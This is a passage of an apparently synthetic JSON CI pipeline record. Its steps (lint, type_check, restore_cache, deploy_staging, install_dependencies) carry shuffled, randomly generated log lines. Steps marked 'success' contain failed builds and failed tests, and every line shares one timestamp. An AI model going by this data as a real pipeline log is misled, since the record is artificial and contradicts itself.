          "Cache hit for key-2140",
          "  PASS: test_api_health (81ms)",
          "Cache hit for key-8728",
          "Compiling src/index.js...",
          "Exception: TypeError",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 2/10: Building",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (149ms)",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Installing axios@3.19.0",
          "Cache hit for key-8921",
          "Cache hit for key-5159",
          "Compiling src/service.java...",
          "  PASS: test_user_create (454ms)",
          "  PASS: test_db_connect (292ms)",
          "Installing lodash@1.14.0",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "  PASS: test_api_health (23ms)",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_db_connect (361ms)",
          "Step 3/10: Building",
          "[12:00:34] INFO: Processing request",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing prettier@4.11.0",
          "Cache hit for key-8066",
          "  PASS: test_api_health (226ms)",
          "  PASS: test_user_create (111ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-2648",
          "Cache hit for key-2978",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_cache_hit (182ms)",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "Cache hit for key-8757",
          "Installing eslint@3.0.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:34] INFO: Processing request",
          "Step 6/10: Building",
          "  PASS: test_auth_login (304ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Installing express@4.1.0",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Cache hit for key-2202",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-9288",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: test_cache_hit (39ms)",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (325ms)",
          "  PASS: test_db_connect (405ms)",
          "Installing eslint@3.20.0",
          "Installing express@5.3.0",
          "Step 4/10: Building",
          "  PASS: test_user_create (260ms)",
          "  PASS: test_auth_login (187ms)",
          "Installing prettier@1.12.0",
          "  PASS: test_api_health (447ms)",
          "  PASS: test_auth_login (190ms)",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-6770",
          "Step 10/10: Building",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (45ms)",
          "Cache hit for key-9492",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:34] INFO: Processing request",
          "Installing eslint@2.7.0",
          "Step 3/10: Building",
          "FAILED: test_cache_hit",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 lint completed",
          "Installing jest@1.5.0",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 6",
          "  PASS: test_user_create (192ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-3216",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-2251",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (76ms)",
          "  PASS: test_user_create (489ms)",
          "Installing express@5.13.0",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-2604",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Installing jest@5.5.0",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 test completed",
          "Installing prettier@1.18.0",
          "Step 5/10: Building",
          "Cache hit for key-1820",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Step 9/10: Building",
          "  PASS: test_cache_hit (314ms)",
          "Step 4/10: Building",
          "  PASS: test_auth_login (82ms)",
          "Step 1/10: Building",
          "[12:00:34] ERROR: Connection failed",
          "Cache hit for key-4103",
          "Step 1/10: Building",
          "Step 3/10: Building",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-6035",
          "  PASS: test_user_create (116ms)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Installing prettier@5.4.0",
          "  PASS: test_cache_hit (167ms)",
          "Step 8/10: Building",
          "Installing lodash@1.0.0",
          "\u2713 test completed",
          "  PASS: test_cache_hit (408ms)",
          "Installing axios@1.3.0",
          "[12:00:34] INFO: Processing request",
          "Exception: NullPointerException",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing react@1.7.0",
          "Compiling src/service.java...",
          "Step 4/10: Building",
          "Step 5/10: Building",
          "Installing eslint@5.10.0",
          "  PASS: test_api_health (423ms)",
          "Installing jest@1.12.0",
          "WARNING: lodash has known vulnerabilities",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Installing jest@3.0.0",
          "\u2713 test completed",
          "\u2713 test completed",
          "Cache hit for key-6604",
          "Cache hit for key-2374",
          "Installing lodash@4.6.0",
          "FAILED: test_db_connect",
          "Cache hit for key-1384",
          "[12:00:34] ERROR: Connection failed",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 test completed",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_api_health (60ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2717 build failed with exit code 25",
          "Compiling src/index.js...",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-20T12:02:13.353521",
        "finished_at": "2025-12-20T12:02:22.858904",
        "log_lines": [
          "=== Step: type_check ===",
          "Step 6/10: Building",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (345ms)",
          "Installing axios@1.13.0",
          "  PASS: test_auth_login (431ms)",
          "Installing eslint@3.2.0",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (469ms)",
          "  PASS: test_cache_hit (342ms)",
          "Compiling src/index.js...",
          "Cache hit for key-7047",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:00:34] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: react has known vulnerabilities",
          "Cache hit for key-3357",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Installing react@3.7.0",
          "Step 8/10: Building",
          "Installing jest@5.16.0",
          "Step 7/10: Building",
          "Cache hit for key-5551",
          "  PASS: test_db_connect (165ms)",
          "Installing axios@5.11.0",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2713 build completed",
          "\u2713 build completed",
          "Installing express@2.5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "Installing react@5.20.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-6245",
          "  PASS: test_cache_hit (168ms)",
          "Compiling src/utils.go...",
          "Cache hit for key-9505",
          "\u2713 lint completed",
          "Cache hit for key-9219",
          "  PASS: test_api_health (268ms)",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-2036",
          "  PASS: test_auth_login (317ms)",
          "Installing jest@4.1.0",
          "[12:00:34] INFO: Processing request",
          "FAILED: test_api_health",
          "Step 5/10: Building",
          "Step 3/10: Building",
          "\u2713 build completed",
          "WARNING: express has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-9350",
          "\u2713 build completed",
          "Step 3/10: Building",
          "Cache hit for key-6663",
          "Cache hit for key-5464",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Step 4/10: Building",
          "  PASS: test_api_health (95ms)",
          "Step 4/10: Building",
          "Cache hit for key-1167",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (244ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-7683",
          "Installing react@1.16.0",
          "Step 9/10: Building",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 test completed",
          "  PASS: test_db_connect (455ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 8/10: Building",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Installing webpack@5.7.0",
          "\u2717 build failed with exit code 89",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing webpack@3.17.0",
          "\u2713 test completed",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Installing lodash@1.14.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Cache hit for key-6580",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Installing prettier@4.9.0",
          "  PASS: test_api_health (318ms)",
          "[12:00:34] ERROR: Connection failed",
          "  PASS: test_db_connect (373ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_cache_hit (154ms)",
          "Step 2/10: Building",
          "Cache hit for key-5046",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Compiling src/index.js...",
          "Cache hit for key-3128",
          "[12:00:34] ERROR: Connection failed",
          "Step 10/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (472ms)",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_auth_login (309ms)",
          "Installing express@3.17.0",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (114ms)",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Installing webpack@1.17.0",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Step 6/10: Building",
          "Installing express@4.15.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Installing axios@3.12.0",
          "Installing webpack@1.2.0",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (5ms)",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 7/10: Building",
          "  PASS: test_user_create (78ms)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (70ms)",
          "\u2713 test completed",
          "Installing axios@2.5.0",
          "[12:00:34] INFO: Processing request",
          "Step 2/10: Building",
          "Step 3/10: Building",
          "Cache hit for key-4051",
          "\u2713 test completed",
          "Installing react@3.12.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 build completed",
          "Step 8/10: Building",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing express@3.16.0",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "Step 2/10: Building",
          "Cache hit for key-4048",
          "Compiling src/service.java...",
          "Step 7/10: Building",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "  PASS: test_api_health (34ms)",
          "\u2713 test completed",
          "[12:00:34] WARN: Deprecated API usage",
          "  PASS: test_auth_login (283ms)",
          "Cache hit for key-5375",
          "Installing axios@5.5.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 10/10: Building",
          "Installing jest@4.5.0",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_user_create (367ms)",
          "Compiling src/service.java...",
          "Cache hit for key-6521",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-20T12:02:22.858904",
        "finished_at": "2025-12-20T12:02:28.562134",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing express@3.6.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing webpack@2.5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 lint completed",
          "Cache hit for key-4460",
          "Installing prettier@5.13.0",
          "Installing react@5.12.0",
          "Compiling src/handler.rs...",
          "[12:00:34] ERROR: Connection failed",
          "Installing eslint@4.6.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Cache hit for key-5068",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_api_health (142ms)",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "Exception: RuntimeError",
          "[12:00:34] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "Installing prettier@1.3.0",
          "Installing webpack@4.4.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing lodash@1.17.0",
          "\u2713 test completed",
          "Cache hit for key-5420",
          "Step 2/10: Building",
          "Installing eslint@4.13.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Step 8/10: Building",
          "Installing react@3.0.0",
          "  PASS: test_user_create (154ms)",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 6/10: Building",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "  PASS: test_auth_login (12ms)",
          "WARNING: express has known vulnerabilities",
          "Installing axios@1.9.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-9298",
          "Cache hit for key-5302",
          "Step 7/10: Building",
          "[12:00:34] INFO: Processing request",
          "Step 6/10: Building",
          "  PASS: test_db_connect (493ms)",
          "Step 7/10: Building",
          "WARNING: react has known vulnerabilities",
          "Installing eslint@4.14.0",
          "\u2717 build failed with exit code 113",
          "Step 5/10: Building",
          "Cache hit for key-5441",
          "Cache hit for key-6259",
          "Cache hit for key-6710",
          "[12:00:34] INFO: Processing request",
          "Compiling src/index.js...",
          "Cache hit for key-6111",
          "Cache hit for key-1091",
          "\u2717 build failed with exit code 106",
          "\u2713 build completed",
          "  PASS: test_api_health (186ms)",
          "Step 3/10: Building",
          "Step 10/10: Building",
          "WARNING: react has known vulnerabilities",
          "Installing eslint@5.2.0",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-6695",
          "Installing axios@3.1.0",
          "Installing react@4.10.0",
          "\u2713 lint completed",
          "Installing express@5.12.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "FAILED: test_api_health",
          "  PASS: test_user_create (48ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Installing lodash@3.18.0",
          "\u2713 test completed",
          "  PASS: test_api_health (250ms)",
          "Installing react@2.5.0",
          "Cache hit for key-3098",
          "Cache hit for key-6375",
          "Cache hit for key-6217",
          "FAILED: test_cache_hit",
          "Cache hit for key-8731",
          "  PASS: test_db_connect (365ms)",
          "  PASS: test_cache_hit (450ms)",
          "\u2713 lint completed",
          "Installing react@4.3.0",
          "Step 2/10: Building",
          "Step 10/10: Building",
          "Installing eslint@5.18.0",
          "[12:00:34] INFO: Processing request",
          "Step 1/10: Building",
          "Cache hit for key-6366",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (240ms)",
          "Cache hit for key-8906",
          "Installing lodash@2.16.0",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (42MB)",
          "  PASS: test_cache_hit (80ms)",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Installing eslint@1.17.0",
          "Step 10/10: Building",
          "\u2717 build failed with exit code 122",
          "[12:00:34] INFO: Processing request",
          "Compiling src/index.js...",
          "  PASS: test_api_health (29ms)",
          "\u2713 test completed",
          "Step 6/10: Building",
          "Cache hit for key-2900",
          "Compiling src/index.js...",
          "Step 5/10: Building",
          "  PASS: test_user_create (252ms)",
          "WARNING: webpack has known vulnerabilities",
          "Installing express@5.10.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_db_connect (340ms)",
          "[12:00:34] INFO: Processing request",
          "Installing lodash@5.8.0",
          "[12:00:34] WARN: Deprecated API usage",
          "Step 4/10: Building",
          "Step 5/10: Building",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (449ms)",
          "Installing react@5.19.0",
          "\u2713 test completed",
          "Cache hit for key-8146",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Step 9/10: Building",
          "Cache hit for key-3996",
          "  PASS: test_api_health (440ms)",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Cache hit for key-6227",
          "Installing react@1.5.0",
          "Cache hit for key-5594",
          "Cache hit for key-6020",
          "\u2713 build completed",
          "  PASS: test_cache_hit (232ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 8/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u2713 build completed",
          "  PASS: test_cache_hit (72ms)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling src/app.ts...",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Cache hit for key-2488",
          "Step 8/10: Building",
          "  PASS: test_api_health (192ms)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/index.js...",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Cache hit for key-6761",
          "Step 6/10: Building",
          "  PASS: test_db_connect (228ms)",
          "Installing webpack@1.4.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Cache hit for key-8692",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "  PASS: test_user_create (96ms)",
          "Installing express@5.6.0",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_api_health (419ms)",
          "  PASS: test_db_connect (246ms)",
          "WARNING: lodash has known vulnerabilities",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-20T12:02:28.562134",
        "finished_at": "2025-12-20T12:02:38.067517",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "  PASS: test_api_health (488ms)",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "Installing prettier@2.20.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 3/10: Building",
          "  PASS: test_user_create (377ms)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (19ms)",
          "Installing express@2.13.0",
          "Compiling src/service.java...",
          "  PASS: test_user_create (318ms)",
          "Installing lodash@3.3.0",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-3712",
          "  PASS: test_auth_login (14ms)",
          "Cache hit for key-9286",
          "Step 6/10: Building",
          "\u2713 test completed",
          "Step 2/10: Building",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (16MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing prettier@5.2.0",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-7469",
          "Step 5/10: Building",
          "Compiling src/utils.go...",
          "Step 9/10: Building",
          "Step 7/10: Building",
          "  PASS: test_db_connect (91ms)",
          "Cache hit for key-5230",
          "Installing prettier@2.14.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "  PASS: test_db_connect (174ms)",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_cache_hit (326ms)",
          "Installing express@5.0.0",
          "Installing jest@5.14.0",
          "  PASS: test_user_create (111ms)",
          "Step 4/10: Building",
          "  PASS: test_auth_login (228ms)",
          "Installing jest@4.5.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-5287",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing react@4.8.0",
          "\u2713 lint completed",
          "Cache hit for key-8209",
          "  PASS: test_api_health (28ms)",
          "Cache hit for key-9890",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: eslint has known vulnerabilities",
          "Step 3/10: Building",
          "Step 1/10: Building",
          "Installing jest@5.9.0",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-1216",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 test completed",
          "Installing jest@2.18.0",
          "Cache hit for key-5446",
          "Compiling src/main.py...",
          "Cache hit for key-8232",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-5881",
          "Exception: NullPointerException",
          "Step 10/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing eslint@4.2.0",
          "Compiling src/service.java...",
          "  PASS: test_api_health (112ms)",
          "FAILED: test_cache_hit",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-1685",
          "Compiling src/service.java...",
          "Cache hit for key-1187",
          "Installing lodash@5.0.0",
          "[12:00:34] INFO: Processing request",
          "Step 2/10: Building",
          "[12:00:34] INFO: Processing request",
          "Installing jest@3.9.0",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "Installing jest@2.12.0",
          "Cache hit for key-3451",
          "Step 1/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "Installing webpack@1.5.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Installing axios@1.11.0",
          "  PASS: test_cache_hit (342ms)",
          "Cache hit for key-2931",
          "Cache hit for key-7827",
          "  PASS: test_auth_login (348ms)",
          "\u2713 test completed",
          "Step 4/10: Building",
          "  PASS: test_api_health (164ms)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "Installing eslint@1.13.0",
          "Step 9/10: Building",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "WARNING: axios has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Step 6/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "Step 8/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:34] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 test completed",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Installing eslint@5.6.0",
          "Step 5/10: Building",
          "Installing axios@5.3.0",
          "Compiling src/handler.rs...",
          "Installing express@5.10.0",
          "  PASS: test_db_connect (144ms)",
          "[12:00:34] INFO: Processing request",
          "Installing axios@1.16.0",
          "Installing eslint@2.5.0",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Installing express@1.18.0",
          "Cache hit for key-9029",
          "Cache hit for key-1492",
          "\u2713 lint completed",
          "Cache hit for key-6221",
          "Step 6/10: Building",
          "Installing webpack@4.8.0",
          "  PASS: test_api_health (1ms)",
          "Step 4/10: Building",
          "Step 2/10: Building",
          "  PASS: test_db_connect (50ms)",
          "Installing express@5.13.0",
          "\u2713 test completed",
          "Cache hit for key-7890",
          "Step 6/10: Building",
          "Step 9/10: Building",
          "  PASS: test_user_create (59ms)",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (314ms)",
          "Compiling src/main.py...",
          "  PASS: test_api_health (103ms)",
          "Step 4/10: Building",
          "Installing jest@3.11.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:34] INFO: Processing request",
          "\u2717 build failed with exit code 98",
          "  PASS: test_auth_login (275ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 4/10: Building",
          "Compiling src/handler.rs...",
          "Installing prettier@3.20.0",
          "Step 3/10: Building",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "Installing eslint@5.17.0",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (3MB)",
          "  PASS: test_api_health (412ms)",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-7962",
          "Step 9/10: Building",
          "Installing react@4.14.0",
          "\u2717 build failed with exit code 112",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (261ms)",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-20T12:02:38.067517",
        "finished_at": "2025-12-20T12:03:06.583666",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "WARNING: jest has known vulnerabilities",
          "Step 1/10: Building",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] ERROR: Connection failed",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache hit for key-4859",
          "Installing webpack@4.17.0",
          "Compiling src/index.js...",
          "Exception: RuntimeError",
          "  PASS: test_user_create (1ms)",
          "Installing lodash@2.14.0",
          "  PASS: test_api_health (404ms)",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (474ms)",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Step 6/10: Building",
          "Installing jest@3.8.0",
          "  PASS: test_cache_hit (252ms)",
          "  PASS: test_api_health (23ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_cache_hit (172ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-9580",
          "Compiling src/index.js...",
          "FAILED: test_db_connect",
          "Step 8/10: Building",
          "Cache hit for key-4393",
          "Artifact uploaded: build.tar.gz (29MB)",
          "  PASS: test_user_create (493ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_api_health (276ms)",
          "Compiling src/index.js...",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-3021",
          "Step 8/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_db_connect (393ms)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2717 build failed with exit code 103",
          "Step 3/10: Building",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 build completed",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing react@5.1.0",
          "Exception: ValueError",
          "[12:00:34] WARN: Deprecated API usage",
          "FAILED: test_db_connect",
